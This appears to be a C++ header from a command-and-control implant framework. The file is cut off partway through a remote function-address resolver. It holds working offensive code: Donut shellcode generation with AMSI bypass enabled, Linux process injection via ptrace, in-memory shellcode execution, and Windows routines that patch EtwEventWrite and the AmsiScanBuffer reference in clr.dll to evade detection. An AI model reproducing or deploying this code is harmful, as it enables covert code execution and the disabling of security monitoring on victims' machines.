#pragma once

#include <algorithm>
#include <cstdio>
#include <string>
#include <vector>

#ifdef __linux__
    #include <sys/mman.h>
    #include <sys/ptrace.h>
    #include <sys/wait.h>
    #include <sys/user.h>
    #include <spawn.h>
    #include <thread>
    #include <future>
    #define __cdecl __attribute__((__cdecl__))
#elif _WIN32
    #include <windows.h>
    #include <io.h>
    #include <fcntl.h>
    // #include <altstr.h>

    #include "syscall.hpp"
#endif


#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)

#include <donut.h>


// create the shellcode from exe, unmanaged DLL/EXE or .NET DLL/EXE
// method, name of method or DLL function to invoke for .NET DLL and unmanaged DLL
// param, command line to use for unmanaged DLL/EXE and .NET DLL/EXE
std::string static inline creatShellCodeDonut(
    std::string cmd, std::string method, std::string param, std::string& shellcode, bool exitProcess=true, bool debug=false, std::string arch = "x64")
{
    std::string result;

    // Donut
    DONUT_CONFIG c;
    memset(&c, 0, sizeof(c));

    // copy input file
    memcpy(c.input, cmd.c_str(), DONUT_MAX_NAME - 1);

    // default settings

    c.inst_type = DONUT_INSTANCE_EMBED; // file is embedded

    if(arch=="x64")
        c.arch = DONUT_ARCH_X64;
    else if(arch=="x86")
        c.arch = DONUT_ARCH_X86;
    else if(arch=="arm64")
        c.arch = DONUT_ARCH_ARM64;
    else
        c.arch = DONUT_ARCH_X84;

    c.bypass = DONUT_BYPASS_CONTINUE;    // continues loading even if disabling AMSI/WLDP fails
    c.format = DONUT_FORMAT_BINARY;        // default output format
    c.compress = DONUT_COMPRESS_NONE;    // compression is disabled by default
    c.entropy = DONUT_ENTROPY_DEFAULT;    // enable random names + symmetric encryption by default
    c.headers = DONUT_HEADERS_OVERWRITE;
    if(exitProcess)
        c.exit_opt = DONUT_OPT_EXIT_PROCESS;// exit process
    else
        c.exit_opt = DONUT_OPT_EXIT_THREAD; // exit thread
    c.thread = 0;                        // run entrypoint as a thread
    c.unicode = 0;                        // command line will not be converted to unicode for unmanaged DLL function
    
    if(debug)
    {
        // debug settings
        c.bypass = DONUT_BYPASS_NONE;    // continues loading even if disabling AMSI/WLDP fails
        c.entropy = DONUT_ENTROPY_NONE;    // enable random names + symmetric encryption by default
    }

    if(method.size() <= (DONUT_MAX_NAME - 1) && param.size() <= (DONUT_MAX_NAME - 1)) 
    {    
        memcpy(c.args, param.c_str(), param.size());
        memcpy(c.method, method.c_str(), method.size());
    }

    // generate the shellcode
    int err = DonutCreate(&c);
    if (err != DONUT_ERROR_OK)
    {
        result += "Donut Error : ";
        result += DonutError(err);
        result += "\n";
        return result;
    }

    std::ifstream input(c.output, std::ios::binary);
    std::string buffer(std::istreambuf_iterator<char>(input), {});
    shellcode = buffer;

    DonutDelete(&c);

    result = "Donut Sucess.\n";

    return result;
}

#endif

#ifdef __linux__

#include <string.h>

int static inline inject_data (pid_t pid, const char *src, void *dst, int len)
{
  int  i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

    for(int i = 0; i < len; i+=4, s++, d++)
    {
        if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
        {
            return -1;
        }
    }

  return 0;
}

std::string static inline inject(int pid, const std::string& payload, bool useSyscall)
{
    std::string result;

    pid_t target = pid;
    
    struct user_regs_struct regs;
    int syscall;
    long dst;

    result+="Tracing process:";
    result+=std::to_string(pid);
    result+="\n";
      if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
        result = "Error ptrace(ATTACH): ";
        result += strerror(errno);
        return result;
    }

    result+="Waiting for process\n";
    wait (NULL);

    result+="Getting Register\n";
    if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
        result = "Error ptrace(GETREGS): ";
        result += strerror(errno);
        return result;
    }
    
    result+="Injecting shell code\n";
    if(inject_data (target, payload.data(), (void*)regs.rip, payload.size())==-1)
    {
        result = "Error ptrace(POKETEXT): ";
        result += strerror(errno);
        return result;
    }

    regs.rip += 2;

    result+="Setting instruction pointer\n";
      if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
        result = "Error ptrace(GETREGS): ";
        result += strerror(errno);
        return result;
    }

    result+="Run it!\n";
    if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
    {
        result = "Error ptrace(DETACH): ";
        result += strerror(errno);
        return result;
    }

    result+="Injection success.\n";
    return result;
}

void static inline execShellCode(const std::string& payload)
{
    void *page = mmap(NULL, payload.size(), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    memcpy(page, payload.data(), payload.size());
    mprotect(page, payload.size(), PROT_READ|PROT_EXEC);
    ((void(*)())page)();

    return;
}

// std::string static inline selfInject(const std::string& payload)
// {
//     std::string result;

//     std::thread t1(execShellCode, payload);
//     t1.detach();

//     return result;
// }

int static inline launchProcess(const std::string& processToSpawn)
{
    std::string cmd = processToSpawn;
    std::string program = "sh";
    std::string programArg = "-c";
    std::string programPath = "/bin/sh";

    pid_t pid=-1;
    char *argv[] = {program.data(), programArg.data(), cmd.data(), NULL};
    int status = posix_spawn(&pid, programPath.data(), NULL, NULL, argv, NULL);
    if (status == 0) 
    {
        pid_t endID=waitpid(pid, &status, WNOHANG);

        std::cout << "pid " << pid << std::endl;
        std::cout << "endID " << endID << std::endl;
    } 

    return pid;
}

std::string static inline spawnInject(const std::string& payload, const std::string& processToSpawn, bool useSyscall)
{
    std::string result = "TODO";

//     std::string cmd = processToSpawn;
//     std::string program = "sh";
//     std::string programArg = "-c";
//     std::string programPath = "/bin/sh";

//     pid_t pid;
//     char *argv[] = {program.data(), programArg.data(), cmd.data(), NULL};
//     int status;
//     fflush(NULL);
//     status = posix_spawn(&pid, programPath.data(), NULL, NULL, argv, NULL);
//     if (status == 0) 
//     {
//         result =+ "Process injected.";
//         fflush(NULL);

//         inject(pid, payload);

//         // if (waitpid(pid, &status, 0) != -1) 
//         // {
//         // } 
//         // else 
//         // {
//         //     perror("waitpid");
//         // }
//     } 
//     else 
//     {
//         result =+ "Posix_spawn failed.";
//     }
    return result;
}


#elif _WIN32


int static inline launchProcess(const std::string& processToSpawn)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(processToSpawn.c_str(), NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    return pi.dwProcessId;
}


int static inline patchEtw()
{
    void * pEventWrite = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
    
    HANDLE hProc=(HANDLE)-1;
    DWORD oldprotect = 0;
    HANDLE hProcess = GetCurrentProcess();
    SIZE_T dwSize = 1024;
    void * protectBase = pEventWrite;
    // NtProtectVirtualMemory may round/update BaseAddress in place; keep the original
    // target pointer untouched for WriteProcessMemory/FlushInstructionCache.
    Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, PAGE_READWRITE, &oldprotect);

    #if defined(_M_ARM64) || defined(__aarch64__)
        char patch[] = "\x00\x00\x80\x52\xc0\x03\x5f\xd6"; // mov w0, #0; ret
        int patchSize = 8;
    #elif defined(_WIN64)
        char patch[] = "\x48\x33\xc0\xc3"; // xor rax, rax; ret
        int patchSize = 4;
    #else
        char patch[] = "\x33\xc0\xc2\x14\x00"; // xor eax, eax; ret 14
        int patchSize = 5;
    #endif
    
    WriteProcessMemory(hProc, pEventWrite, (PVOID)patch, patchSize, nullptr);

    FlushInstructionCache(GetCurrentProcess(), pEventWrite, patchSize);

    Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, oldprotect, &oldprotect);

    return 0;
}


static bool GetModuleRange(HMODULE moduleBase, BYTE** moduleStart, SIZE_T* moduleSize)
{
    if (!moduleBase || !moduleStart || !moduleSize)
        return false;

    BYTE* base = reinterpret_cast<BYTE*>(moduleBase);

    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return false;

    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return false;

    *moduleStart = base;
    *moduleSize = nt->OptionalHeader.SizeOfImage;

    return true;
}


static BYTE* FindBytes(BYTE* start, SIZE_T size, const std::vector<BYTE>& pattern)
{
    if (!start || size == 0 || pattern.empty() || pattern.size() > size)
        return nullptr;

    BYTE* end = start + size - pattern.size();

    for (BYTE* p = start; p <= end; p++)
    {
        if (memcmp(p, pattern.data(), pattern.size()) == 0)
            return p;
    }

    return nullptr;
}


static bool IsReadablePage(DWORD protect)
{
    if (protect & PAGE_GUARD)
        return false;

    if (protect & PAGE_NOACCESS)
        return false;

    DWORD baseProtect = protect & 0xff;

    switch (baseProtect)
    {
    case PAGE_READONLY:
    case PAGE_READWRITE:
    case PAGE_WRITECOPY:
    case PAGE_EXECUTE_READ:
    case PAGE_EXECUTE_READWRITE:
    case PAGE_EXECUTE_WRITECOPY:
        return true;

    default:
        return false;
    }
}


static BYTE* FindBytesInReadableMemory(
    BYTE* start,
    SIZE_T size,
    const std::vector<BYTE>& pattern
)
{
    if (!start || size == 0 || pattern.empty())
        return nullptr;

    BYTE* moduleEnd = start + size;
    BYTE* current = start;

    while (current < moduleEnd)
    {
        MEMORY_BASIC_INFORMATION mbi{};

        if (!VirtualQuery(current, &mbi, sizeof(mbi)))
            break;

        BYTE* regionBase = reinterpret_cast<BYTE*>(mbi.BaseAddress);
        BYTE* regionEnd  = regionBase + mbi.RegionSize;

        if (regionEnd > moduleEnd)
            regionEnd = moduleEnd;

        BYTE* scanStart = current;

        if (scanStart < regionBase)
            scanStart = regionBase;

        if (
            mbi.State == MEM_COMMIT &&
            IsReadablePage(mbi.Protect) &&
            scanStart < regionEnd
        )
        {
            SIZE_T scanSize = static_cast<SIZE_T>(regionEnd - scanStart);

            BYTE* found = FindBytes(scanStart, scanSize, pattern);

            if (found)
                return found;
        }

        current = regionEnd;
    }

    return nullptr;
}

int static inline patchAmsiClr()
{
    HMODULE module = LoadLibrary("clr.dll");

    BYTE* moduleStart = nullptr;
    SIZE_T moduleSize = 0;

    if (!GetModuleRange(module, &moduleStart, &moduleSize))
        return -1;

    // AmsiScanBuffer
    std::vector<BYTE> oldBytes = { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };

    void* found = FindBytesInReadableMemory(
        moduleStart,
        moduleSize,
        oldBytes
    );

    if (!found)
        return -1;

    
    char NewBytes[] = "AAAAAAAAAAAAAA";

    DWORD oldprotect = 0;
    HANDLE hProcess = GetCurrentProcess();
    SIZE_T dwSize = 1024;
    void * protectBase = found;
    // NtProtectVirtualMemory may round/update BaseAddress in place; keep the original
    // target pointer untouched for WriteProcessMemory/FlushInstructionCache.
    Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, PAGE_READWRITE, &oldprotect);
    
    WriteProcessMemory(hProcess, found, (PVOID)NewBytes, 14, nullptr);

    FlushInstructionCache(GetCurrentProcess(), found, 14);

    Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, oldprotect, &oldprotect);

    return 0;
}

// TODO
int static inline patchAmsiPowershell()
{
    return -1;
}


class StdCapture
{
public:
    StdCapture(): m_capturing(false), m_init(false), m_oldStdOut(0), m_oldStdErr(0),
        m_oldStdOutHandle(INVALID_HANDLE_VALUE), m_oldStdErrHandle(INVALID_HANDLE_VALUE),
        m_pipeReadHandle(INVALID_HANDLE_VALUE), m_pipeWriteHandle(INVALID_HANDLE_VALUE)
    {
        m_pipe[READ] = 0;
        m_pipe[WRITE] = 0;
        if (_pipe(m_pipe, 1048576, O_BINARY) == -1)
            return;
        m_oldStdOut = dup(fileno(stdout));
        m_oldStdErr = dup(fileno(stderr));
        if (m_oldStdOut == -1 || m_oldStdErr == -1)
            return;

        m_pipeReadHandle = reinterpret_cast<HANDLE>(_get_osfhandle(m_pipe[READ]));
        m_pipeWriteHandle = reinterpret_cast<HANDLE>(_get_osfhandle(m_pipe[WRITE]));
        if (m_pipeReadHandle == INVALID_HANDLE_VALUE || m_pipeWriteHandle == INVALID_HANDLE_VALUE)
            return;

        m_oldStdOutHandle = GetStdHandle(STD_OUTPUT_HANDLE);
        m_oldStdErrHandle = GetStdHandle(STD_ERROR_HANDLE);

        m_init = true;
    }

    ~StdCapture()
    {
        if (m_capturing)
        {
            EndCapture();
        }
        if (m_oldStdOut > 0)
            close(m_oldStdOut);
        if (m_oldStdErr > 0)
            close(m_oldStdErr);
        if (m_pipe[READ] > 0)
            close(m_pipe[READ]);
        if (m_pipe[WRITE] > 0)
            close(m_pipe[WRITE]);
    }


    void BeginCapture()
    {
        if (!m_init)
            return;
        if (m_capturing)
            EndCapture();
        m_captured.clear();
        fflush(stdout);
        fflush(stderr);
        dup2(m_pipe[WRITE], fileno(stdout));
        dup2(m_pipe[WRITE], fileno(stderr));
        SetStdHandle(STD_OUTPUT_HANDLE, m_pipeWriteHandle);
        SetStdHandle(STD_ERROR_HANDLE, m_pipeWriteHandle);
        m_capturing = true;
    }

    void DrainCapture()
    {
        if (!m_init || m_pipeReadHandle == INVALID_HANDLE_VALUE)
            return;

        for (;;)
        {
            DWORD bytesAvailable = 0;
            if (!PeekNamedPipe(m_pipeReadHandle, NULL, 0, NULL, &bytesAvailable, NULL) || bytesAvailable == 0)
                break;

            const int bytesToRead = static_cast<int>(std::min<DWORD>(bytesAvailable, 4096));
            std::string buf;
            buf.resize(bytesToRead);
            const int bytesRead = read(m_pipe[READ], &(*buf.begin()), bytesToRead);
            if (bytesRead <= 0)
                break;
            buf.resize(bytesRead);
            m_captured += buf;
        }
    }

    bool EndCapture()
    {
        if (!m_init)
            return false;
        if (!m_capturing)
            return false;
        fflush(stdout);
        fflush(stderr);
        dup2(m_oldStdOut, fileno(stdout));
        dup2(m_oldStdErr, fileno(stderr));
        SetStdHandle(STD_OUTPUT_HANDLE, m_oldStdOutHandle);
        SetStdHandle(STD_ERROR_HANDLE, m_oldStdErrHandle);
        DrainCapture();
        m_capturing = false;
        return true;
    }

    std::string GetCapture() const
    {
        std::string::size_type idx = m_captured.find_last_not_of("\r\n");
        if (idx == std::string::npos)
        {
            return m_captured;
        }
        else
        {
            return m_captured.substr(0, idx+1);
        }
    }

private:
    enum PIPES { READ, WRITE };
    int m_pipe[2];
    int m_oldStdOut;
    int m_oldStdErr;
    HANDLE m_oldStdOutHandle;
    HANDLE m_oldStdErrHandle;
    HANDLE m_pipeReadHandle;
    HANDLE m_pipeWriteHandle;
    bool m_capturing;
    bool m_init;
    std::string m_captured;
};


// https://www.codeproject.com/Tips/139349/Getting-the-address-of-a-function-in-a-DLL-loaded
#include <psapi.h>

HMODULE inline GetRemoteModuleHandle(HANDLE hProcess, LPCSTR lpModuleName)
{
    HMODULE* ModuleArray = NULL;
    DWORD ModuleArraySize = 100;
    DWORD NumModules = 0;
    CHAR lpModuleNameCopy[MAX_PATH] = {0};
    CHAR ModuleNameBuffer[MAX_PATH] = {0};
 
    /* Make sure we didn't get a NULL pointer for the module name */
    if(lpModuleName == NULL)
        goto GRMH_FAIL_JMP;
 
    /* Convert lpModuleName to all lowercase so the comparison isn't case sensitive */
    for (size_t i = 0; lpModuleName[i] != '\0' && i<MAX_PATH; ++i)
    {
        if (lpModuleName[i] >= 'A' && lpModuleName[i] <= 'Z')
            lpModuleNameCopy[i] = lpModuleName[i] + 0x20; // 0x20 is the difference between uppercase and lowercase
        else
            lpModuleNameCopy[i] = lpModuleName[i];
 
        lpModuleNameCopy[i+1] = '\0';
    }
    
    /* Allocate memory to hold the module handles */
    ModuleArray = new HMODULE[ModuleArraySize];
 
    /* Check if the allocation failed */
    if(ModuleArray == NULL)
        goto GRMH_FAIL_JMP;
 
    /* Get handles to all the modules in the target process */
    if(!::EnumProcessModulesEx(hProcess, ModuleArray, ModuleArraySize * sizeof(HMODULE), &NumModules, LIST_MODULES_ALL))
        goto GRMH_FAIL_JMP;
 
    /* We want the number of modules not the number of bytes */
    NumModules /= sizeof(HMODULE);
 
    /* Did we allocate enough memory for all the module handles? */
    if(NumModules > ModuleArraySize)
    {
        delete[] ModuleArray; // Deallocate so we can try again
        ModuleArray = NULL; // Set it to NULL se we can be sure if the next try fails
        ModuleArray = new HMODULE[NumModules]; // Allocate the right amount of memory

        /* Check if the allocation failed */
        if(ModuleArray == NULL)
            goto GRMH_FAIL_JMP;
 
        ModuleArraySize = NumModules; // Update the size of the array
        
        /* Get handles to all the modules in the target process */
        if( !::EnumProcessModulesEx(hProcess, ModuleArray, ModuleArraySize * sizeof(HMODULE), &NumModules, LIST_MODULES_ALL) )
            goto GRMH_FAIL_JMP;
 
        /* We want the number of modules not the number of bytes */
        NumModules /= sizeof(HMODULE);
    }
 
    /* Iterate through all the modules and see if the names match the one we are looking for */
    for(DWORD i = 0; i <= NumModules; ++i)
    {
        /* Get the module's name */
        ::GetModuleBaseName(hProcess, ModuleArray[i], ModuleNameBuffer, sizeof(ModuleNameBuffer));
 
        /* Convert ModuleNameBuffer to all lowercase so the comparison isn't case sensitive */
        for (size_t j = 0; ModuleNameBuffer[j] != '\0' && j<MAX_PATH; ++j)
        {
            if (ModuleNameBuffer[j] >= 'A' && ModuleNameBuffer[j] <= 'Z')
                ModuleNameBuffer[j] += 0x20; // 0x20 is the difference between uppercase and lowercase
        }
 
        /* Does the name match? */
        if(strstr(ModuleNameBuffer, lpModuleNameCopy) != NULL)
        {
            /* Make a temporary variable to hold return value*/
            HMODULE TempReturn = ModuleArray[i];
 
            /* Give back that memory */
            delete[] ModuleArray;
 
            /* Success */
            return TempReturn;
        }
 
        /* Wrong module let's try the next... */
    }
 
/* Uh Oh... */
GRMH_FAIL_JMP:
 
    /* If we got to the point where we allocated memory we need to give it back */
    if(ModuleArray != NULL)
        delete[] ModuleArray;
 
    /* Failure... */
    return NULL;
}
 

//-----------------------------------------------------------------------------
// TODO recode GetRemoteModuleHandle to use the peb - https://github.com/ricardojoserf/NativeDump/blob/c-flavour/NativeDump/NativeDump.cpp
FARPROC inline GetRemoteProcAddress (HANDLE hProcess, HMODULE hModule, LPCSTR lpProcName, UINT Ordinal, BOOL UseOrdinal)
{
    BOOL Is64Bit = FALSE;
    MODULEINFO RemoteModuleInfo = {0};
    UINT_PTR RemoteModuleBaseVA = 0;
    IMAGE_DOS_HEADER DosHeader = {0};
    DWORD Signature = 0;
    IMAGE_FILE_HEADER FileHeader = {0};
    IMAGE_OPTIONAL_HEADER64 OptHeader64 = {0};
    IMAGE_OPTIONAL_HEADER32 OptHeader32 = {0};
    IMAGE_DATA_DIRECTORY ExportDirectory = {0};
    IMAGE_EXPORT_DIRECTORY ExportTable = {0};
    UINT_PTR ExportFunctionTableVA = 0;
    UINT_PTR ExportNameTableVA = 0;
    UINT_PTR ExportOrdinalTableVA = 0;
    DWORD* ExportFunctionTable = NULL;
    DWORD* ExportNameTable = NULL;
    WORD* ExportOrdinalTable = NULL;
 
    /* Temporary variables not used until much later but easier
    /* to define here than in all the the places they are used */
    CHAR TempChar;
    BOOL Done = FALSE;
 
    /* Check to make sure we didn't get a NULL pointer for the name unless we are searching by ordinal */
    if(lpProcName == NULL && !UseOrdinal)
        goto GRPA_FAIL_JMP;
 
    /* Get the base address of the remote module along with some other info we don't need */
    if(!::GetModuleInformation(hProcess, hModule,&RemoteModuleInfo, sizeof(RemoteModuleInfo)))
        goto GRPA_FAIL_JMP;
    RemoteModuleBaseVA    = (UINT_PTR)RemoteModuleInfo.lpBaseOfDll;
 
    /* Read the DOS header and check it's magic number */
    if(!::ReadProcessMemory(hProcess, (LPCVOID)RemoteModuleBaseVA, &DosHeader,
        sizeof(DosHeader), NULL) || DosHeader.e_magic != IMAGE_DOS_SIGNATURE)
        goto GRPA_FAIL_JMP;
 
    /* Read and check the NT signature */
    if(!::ReadProcessMemory(hProcess, (LPCVOID)(RemoteModuleBaseVA + DosHeader.e_lfanew),
        &Signature, sizeof(Signature), NULL) || Signature != IMAGE_NT_SIGNATURE)
        goto GRPA_FAIL_JMP;
    
    /* Read the main header */
    if(!::ReadProcessMemory(hProcess,
        (LPCVOID)(RemoteModuleBaseVA + DosHeader.e_lfanew + sizeof(Signature)),
        &FileHeader, sizeof(FileHeader), NULL))
        goto GRPA_FAIL_JMP;
 
    /* Which type of optional header is the right size? */
    if(FileHeader.SizeOfOptionalHeader == sizeof(OptHeader64))
        Is64Bit = TRUE;
    else if(FileHeader.SizeOfOptionalHeader == sizeof(OptHeader32))
        Is64Bit = FALSE;
    else
        goto GRPA_FAIL_JMP;
 
    if(Is64Bit)
    {
        /* Read the optional header and check it's magic number */
        if(!::ReadProcessMemory(hProcess,
            (LPCVOID)(RemoteModuleBaseVA + DosHeader.e_lfanew + sizeof(Signature) + sizeof(FileHeader)),
            &OptHeader64, FileHeader.SizeOfOptionalHeader, NULL)
            || OptHeader64.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
            goto GRPA_FAIL_JMP;
    }
    else
    {
        /* Read the optional header and check it's magic number */
        if(!::ReadProcessMemory(hProcess,
            (LPCVOID)(RemoteModuleBaseVA + DosHeader.e_lfanew + sizeof(Signature) + sizeof(FileHeader)),
            &OptHeader32, FileHeader.SizeOfOptionalHeader, NULL)
            || OptHeader32.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
            goto GRPA_FAIL_JMP;
    }
 
    /* Make sure the remote module has an export directory and if it does save it's relative address and size */
    if(Is64Bit && OptHeader64.NumberOfRvaAndSizes >= IMAGE_DIRECTORY_ENTRY_EXPORT + 1)
    {
        ExportDirectory.VirtualAddress = (OptHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress;
        ExportDirectory.Size = (OptHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).Size;
    }
    else if(OptHeader32.NumberOfRvaAndSizes >= IMAGE_DIRECTORY_ENTRY_EXPORT + 1)
    {
        ExportDirectory.VirtualAddress = (OptHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress;
        ExportDirectory.Size = (OptHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).Size;
    }
    else
        goto GRPA_FAIL_JMP;
 
    /* Read the main export table */
    if(!::ReadProcessMemory(hProcess, (LPCVOID)(RemoteModuleBaseVA + ExportDirectory.VirtualAddress), &ExportTable, sizeof(ExportTable), NULL))
        goto GRPA_FAIL_JMP;
 
    /* Save the absolute address of the tables so we don't need to keep adding the base address */
    ExportFunctionTableVA = RemoteModuleBaseVA + ExportTable.AddressOfFunctions;
    ExportNameTableVA = RemoteModuleBaseVA + ExportTable.AddressOfNames;
    ExportOrdinalTableVA = RemoteModuleBaseVA + ExportTable.AddressOfNameOrdinals;
 
    /* Allocate memory for our copy of the tables */
    ExportFunctionTable    = new DWORD[ExportTable.NumberOfFunctions];
    ExportNameTable        = new DWORD[ExportTable.NumberOfNames];
    ExportOrdinalTable    = new WORD[ExportTable.NumberOfNames];
 
    /* Check if the allocation failed */
    if(ExportFunctionTable == NULL || ExportNameTable == NULL || ExportOrdinalTable == NULL)
        goto GRPA_FAIL_JMP;
 
    /* Get a copy of the function table */
    if(!::ReadProcessMemory(hProcess, (LPCVOID)ExportFunctionTableVA,
        ExportFunctionTable, ExportTable.NumberOfFunctions * sizeof(DWORD), NULL))
        goto GRPA_FAIL_JMP;
 
    /* Get a copy of the name table */
    if(!::ReadProcessMemory(hProcess, (LPCVOID)ExportNameTableVA,
        ExportNameTable, ExportTable.NumberOfNames * sizeof(DWORD), NULL))
        goto GRPA_FAIL_JMP;
 
    /* Get a copy of the ordinal table */
    if(!::ReadProcessMemory(hProcess, (LPCVOID)ExportOrdinalTableVA,
        ExportOrdinalTable, ExportTable.NumberOfNames * sizeof(WORD), NULL))
        goto GRPA_FAIL_JMP;
 
    /* If we are searching for an ordinal we do that now */
    if(UseOrdinal)
    {
        /* NOTE:
        /* Microsoft's PE/COFF specification does NOT say we need to subtract the ordinal base
        /* from our ordinal but it seems to always give the wrong function if we don't */
 
        /* Make sure the ordinal is valid */
        if(Ordinal < ExportTable.Base || (Ordinal - ExportTable.Base) >= ExportTable.NumberOfFunctions)
            goto GRPA_FAIL_JMP;
 
        UINT FunctionTableIndex = Ordinal - ExportTable.Base;
 
        /* Check if the function is forwarded and if so get the real address*/
        if(ExportFunctionTable[FunctionTableIndex] >= ExportDirectory.VirtualAddress &&
            ExportFunctionTable[FunctionTableIndex] <= ExportDirectory.VirtualAddress + ExportDirectory.Size)
        {
            Done = FALSE;
            std::string TempForwardString;
            TempForwardString.clear(); // Empty the string so we can fill it with a new name

            /* Get the forwarder string one character at a time because we don't know how long it is */
            for(UINT_PTR i = 0; !Done; ++i)
            {
                /* Get next character */
                if(!::ReadProcessMemory(hProcess,
                    (LPCVOID)(RemoteModuleBaseVA + ExportFunctionTable[FunctionTableIndex] + i),
                    &TempChar, sizeof(TempChar), NULL))
                    goto GRPA_FAIL_JMP;
 
                TempForwardString.push_back(TempChar); // Add it to the string

                /* If it's NUL we are done */
                if(TempChar == (CHAR)'\0')
                    Done = TRUE;
            }
 
            /* Find the dot that seperates the module name and the function name/ordinal */
            size_t Dot = TempForwardString.find('.');
            if(Dot == std::string::npos)
                goto GRPA_FAIL_JMP;
 
            /* Temporary variables that hold parts of the forwarder string */
            std::string RealModuleName, RealFunctionId;
            RealModuleName = TempForwardString.substr(0, Dot - 1);
            RealFunctionId = TempForwardString.substr(Dot + 1, std::string::npos);
 
            HMODULE RealModule = GetRemoteModuleHandle(hProcess, RealModuleName.c_str());
            FARPROC TempReturn;// Make a temporary variable to hold return value 

 
            /* Figure out if the function was exported by name or by ordinal */
            if(RealFunctionId.at(0) == '#') // Exported by ordinal
            {
                UINT RealOrdinal = 0;
                RealFunctionId.erase(0, 1); // Remove '#' from string

                /* My version of atoi() because I was too lazy to use the real one... */
                for(size_t i = 0; i < RealFunctionId.size(); ++i)
                {
                    if(RealFunctionId[i] >= '0' && RealFunctionId[i] <= '9')
                    {
                        RealOrdinal *= 10;
                        RealOrdinal += RealFunctionId[i] - '0';
                    }
                    else
                        break;
                }
 
                /* Recursively call this function to get return value */
                TempReturn = GetRemoteProcAddress(hProcess, RealModule, NULL, RealOrdinal, TRUE);
            }
            else // Exported by name
            {
                /* Recursively call this function to get return value */
                TempReturn = GetRemoteProcAddress(hProcess, RealModule, RealFunctionId.c_str(), 0, FALSE);
            }
            
            /* Give back that memory */
            delete[] ExportFunctionTable;
            delete[] ExportNameTable;
            delete[] ExportOrdinalTable;
            
            /* Success!!! */
            return TempReturn;
        }
        else // Not Forwarded
        {
 
            /* Make a temporary variable to hold return value*/
            FARPROC TempReturn = (FARPROC)(RemoteModuleBaseVA + ExportFunctionTable[FunctionTableIndex]);
                
            /* Give back that memory */
            delete[] ExportFunctionTable;
            delete[] ExportNameTable;
            delete[] ExportOrdinalTable;
            
            /* Success!!! */
            return TempReturn;
        }
    }
 

    /* Iterate through all the names and see if they match the one we are looking for */
    for(DWORD i = 0; i < ExportTable.NumberOfNames; ++i)    {
        std::string TempFunctionName;
 
        Done = FALSE;// Reset for next name
        TempFunctionName.clear(); // Empty the string so we can fill it with a new name

        /* Get the function name one character at a time because we don't know how long it is */
        for(UINT_PTR j = 0; !Done; ++j)
        {
            /* Get next character */
            if(!::ReadProcessMemory(hProcess, (LPCVOID)(RemoteModuleBaseVA + ExportNameTable[i] + j),
                &TempChar, sizeof(TempChar), NULL))
                goto GRPA_FAIL_JMP;
 
            TempFunctionName.push_back(TempChar); // Add it to the string

            /* If it's NUL we are done */
            if(TempChar == (CHAR)'\0')
                Done = TRUE;
        }
 
        /* Does the name match? */
        if(TempFunctionName.find(lpProcName) != std::string::npos)
        {
            /* NOTE:
            /* Microsoft's PE/COFF specification says we need to subtract the ordinal base
            /*from the value in the ordinal table but that seems to always give the wrong function */
 
            /* Check if the function is forwarded and if so get the real address*/
            if(ExportFunctionTable[ExportOrdinalTable[i]] >= ExportDirectory.VirtualAddress &&
                ExportFunctionTable[ExportOrdinalTable[i]] <= ExportDirectory.VirtualAddress + ExportDirectory.Size)
            {
                Done = FALSE;
                std::string TempForwardString;
                TempForwardString.clear(); // Empty the string so we can fill it with a new name

                /* Get the forwarder string one character at a time because we don't know how long it is */
                for(UINT_PTR j = 0; !Done; ++j)
                {
                    /* Get next character */
                    if(!::ReadProcessMemory(hProcess,
                        (LPCVOID)(RemoteModuleBaseVA + ExportFunctionTable[i] + j),
                        &TempChar, sizeof(TempChar), NULL))
                        goto GRPA_FAIL_JMP;
 
                    TempForwardString.push_back(TempChar); // Add it to the string

                    /* If it's NUL we are done */
                    if(TempChar == (CHAR)'\0')
                        Done = TRUE;
                }
 
                /* Find the dot that seperates the module name and the function name/ordinal */
                size_t Dot = TempForwardString.find('.');
                if(Dot == std::string::npos)
                    goto GRPA_FAIL_JMP;
 
                /* Temporary variables that hold parts of the forwarder string */
                std::string RealModuleName, RealFunctionId;
                RealModuleName = TempForwardString.substr(0, Dot);
                RealFunctionId = TempForwardString.substr(Dot + 1, std::string::npos);
 
                HMODULE RealModule = GetRemoteModuleHandle(hProcess, RealModuleName.c_str());
                FARPROC TempReturn;// Make a temporary variable to hold return value 

 
                /* Figure out if the function was exported by name or by ordinal */
                if(RealFunctionId.at(0) == '#') // Exported by ordinal
                {
                    UINT RealOrdinal = 0;
                    RealFunctionId.erase(0, 1); // Remove '#' from string

                    /* My version of atoi() because I was to lazy to use the real one... */
